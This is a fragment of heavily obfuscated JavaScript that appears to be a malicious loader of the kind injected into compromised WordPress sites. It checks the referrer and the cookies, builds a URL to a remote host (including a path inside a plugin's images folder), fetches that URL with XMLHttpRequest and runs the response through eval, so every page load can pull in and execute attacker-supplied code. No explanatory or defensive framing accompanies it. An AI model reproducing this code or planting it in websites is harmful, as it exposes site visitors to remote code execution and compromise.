n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};